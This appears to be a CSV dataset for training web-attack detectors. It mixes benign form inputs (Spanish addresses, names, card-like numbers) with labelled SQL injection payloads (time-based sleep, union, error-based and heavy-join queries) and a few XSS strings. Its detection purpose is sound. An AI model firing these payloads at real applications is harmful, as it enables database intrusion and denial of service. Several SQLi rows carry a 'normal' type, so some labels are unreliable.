Text,attack_type,Label,type
"alqueria de pixarroda, 27",norm,0,normal
1)) as sipp where 1999=1999 and (select * from (select(sleep(5)))fzno)--,sqli,1,sql
"c/ poeta bernardo de la torre 10,",norm,0,normal
79071325q,norm,0,normal
1%'))) rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
chanes galvan,norm,0,normal
"1 where 6173=6173;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
8490972534756597,norm,0,normal
44251271f,norm,0,normal
riudellots de la selva,norm,0,normal
ciochon,norm,0,normal
<video+src=x+onerror=prompt(1);>,xss,2,xss
llena astall,norm,0,normal
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('rfln'='rfln",sqli,1,sql
chin-lin,norm,0,normal
-1643' where 1968=1968 or 3484=6642,sqli,1,normal
"1' and elt(1210=1210,sleep(5)) and 'ioar'='ioar",sqli,1,normal
musson@ajuntamentdebarcelona20.pr,norm,0,normal
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh'='xemh",sqli,1,sql
"1"" and elt(1210=1210,sleep(5)) and ""zhxm""=""zhxm",sqli,1,normal
7771884953425478,norm,0,normal
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('xzcr'='xzcr",sqli,1,normal
3st59et982,norm,0,normal
willeke5,norm,0,normal
33555,norm,0,normal
49145,norm,0,normal
"roure, 43, 3?d",norm,0,normal
2i7c2ar,norm,0,normal
alfajarn,norm,0,normal
"de canoves 13,",norm,0,normal
moharra jodra,norm,0,normal
brivio,norm,0,normal
vladamir,norm,0,normal
"1') where 6746=6746 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
intuitivo,norm,0,normal
1919202553686950,norm,0,normal
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
(case when 2646=8520 then 2646 else null end),sqli,1,normal
46160431y,norm,0,normal
espineta astorquiza,norm,0,normal
"1') as bvvl where 9818=9818 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
marlaud_losee5@redesmilitantes.tf,norm,0,normal
"1""))) or 6793=(select 6793 from pg_sleep(5)) and (((""zgoy"" like ""zgoy",sqli,1,sql
2xorciza989,norm,0,normal
"-5780 or make_set(3464=4518,4518)-- icit",sqli,1,sql
"1"") where 4951=4951;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
46269,norm,0,normal
"san antonio, 105, 9-d",norm,0,normal
villamesas,norm,0,normal
1'||(select 'etvo' from dual where 1557=1557;(select * from (select(sleep(5)))acdk)#,sqli,1,sql
arroyomolinos,norm,0,normal
palacios del arzobispo,norm,0,normal
domich cajahuanca,norm,0,normal
1%'))) and (3020=3020)*6703 and ((('%'=',sqli,1,normal
1872,norm,0,normal
47185,norm,0,normal
"-9953'||(select 'zljk' where 2886=2886 union all select 2886,2886,2886,2886,2886,2886,2886,2886,2886,2886#",sqli,1,sql
leza.vanbrugh@ajuntamentbarcelona2-0.gq,norm,0,normal
stoffels3,norm,0,normal
1'+(select 'qsqs' where 9227=9227 waitfor delay '0:0:5')+',sqli,1,sql
dalmaus estrada,norm,0,normal
equivalentemente,norm,0,normal
09146,norm,0,normal
rizoide,norm,0,normal
"1%';select count(*) from generate_series(1,5000000)--",sqli,1,sql
"-1889%'))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'='",sqli,1,sql
corua del conde,norm,0,normal
24847,norm,0,normal
"1""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""prtf"" like ""prtf",sqli,1,sql
hanny,norm,0,normal
25270,norm,0,normal
leda,norm,0,normal
7590,norm,0,normal
6402233708225431,norm,0,normal
"macario, 87,",norm,0,normal
"c/ cea, 107,",norm,0,normal
wee-seng,norm,0,normal
1) and 5196=9002,sqli,1,normal
i5bursa2i7,norm,0,normal
firestone@artforall.ag,norm,0,normal
0765386023011242,norm,0,normal
miles,norm,0,normal
<b <script>alert(1)//</script>0</script></b>,xss,2,xss
"1')) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('vcvj'='vcvj",sqli,1,sql
35210254z,norm,0,normal
26414,norm,0,normal
sant aniol de finestres,norm,0,normal
urrotz,norm,0,normal
"-8754""))) union all select 7391,7391,7391,7391,7391,7391,7391--",sqli,1,sql
hua,norm,0,normal
"1""))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""sajl""=""sajl",sqli,1,sql
2812685253359971,norm,0,normal
philippa,norm,0,normal
"1) where 6784=6784 and elt(3114=3114,sleep(5))#",sqli,1,normal
bez clua,norm,0,normal
sarmiento,norm,0,normal
alysia,norm,0,normal
"1"";select count(*) from generate_series(1,5000000)",sqli,1,sql
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('lfhx'='lfhx",sqli,1,sql
orford,norm,0,normal
plza. de los conquistadores 182,norm,0,normal
1'+(select eluw where 6210=6210;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
48825670m,norm,0,normal
villalobar de rioja,norm,0,normal
"1%"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""%""=""",sqli,1,normal
46294,norm,0,normal
82444604t,norm,0,normal
escriv,norm,0,normal
llobet viader,norm,0,normal
voight@7horas.li,norm,0,normal
disimtrico,norm,0,normal
"-5417 or elt(1032=1032,3623)",sqli,1,normal
matienzo gallifa,norm,0,normal
"calle beato tomas de zumarraga, 89 12-c",norm,0,normal
1) and 7533=7533 and (7175=7175,sqli,1,normal
54430634f,norm,0,normal
"1%')));select count(*) from generate_series(1,5000000)--",sqli,1,sql
20540,norm,0,normal
"1) where 6150=6150;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"-7307')) union all select 5215,5215,5215,5215--",sqli,1,sql
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)",sqli,1,sql
barlovento,norm,0,normal
20e28u6r,norm,0,normal
1)));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
pavn taracena,norm,0,normal
6apit1,norm,0,normal
canute,norm,0,normal
1')) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('hcpo' like 'hcpo,sqli,1,sql
"1') as saqp where 6612=6612 union all select null,null,null,null,null,null,null--",sqli,1,sql
"1)) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((9914=9914",sqli,1,sql
"moreno lopez, 55, 9-e",norm,0,normal
a2a9ra3-a3,norm,0,normal
joaquin,norm,0,normal
1%'));waitfor delay '0:0:5' and (('%'=',sqli,1,sql
36lis8r,norm,0,normal
fenton@tiposdedrogas.je,norm,0,normal
gontrn,norm,0,normal
"-6184"")) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""rovr""=""rovr",sqli,1,sql
65472744r,norm,0,normal
burguillos de toledo,norm,0,normal
1' rlike (select (case when (5567=5586) then 1 else 0x28 end)) and 'mmnb'='mmnb,sqli,1,sql
-7984' order by 1--,sqli,1,sql
"1'+(select idnb where 2338=2338;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)+'",sqli,1,sql
"1,(select (case when (8596=8596) then 1 else 8596*(select 8596 from mysql.db) end))",sqli,1,sql
escenogrfica,norm,0,normal
"""javascript://""/></head><body><a href=""/. /,alert(1)//",xss,2,xss
3891386369836978,norm,0,normal
9625616287143216,norm,0,normal
igns anzoategui,norm,0,normal
"1)) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((3626=3626",sqli,1,sql
g73no,norm,0,normal
"-2734') union all select 5510,5510,5510,5510,5510#",sqli,1,sql
34192,norm,0,normal
"1"") as iwri where 4921=4921 or (select * from (select(sleep(5)))ydpu)--",sqli,1,sql
"1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
38470,norm,0,normal
8364037780922932,norm,0,normal
37219,norm,0,normal
4e7cr0b37,norm,0,normal
7a13,norm,0,normal
de jongh algarra,norm,0,normal
fonterosa vjar,norm,0,normal
"1""))) and make_set(8403=8403,8899) and (((""uisi""=""uisi",sqli,1,normal
37799,norm,0,normal
kelkar,norm,0,normal
49779839l,norm,0,normal
16620,norm,0,normal
2756434329152004,norm,0,normal
olmo,norm,0,normal
"1'||(select 'ymre' where 8681=8681;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
efrn,norm,0,normal
linares queralto,norm,0,normal
9at39243z3,norm,0,normal
"-7001'+(select slav where 9321=9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",sqli,1,sql
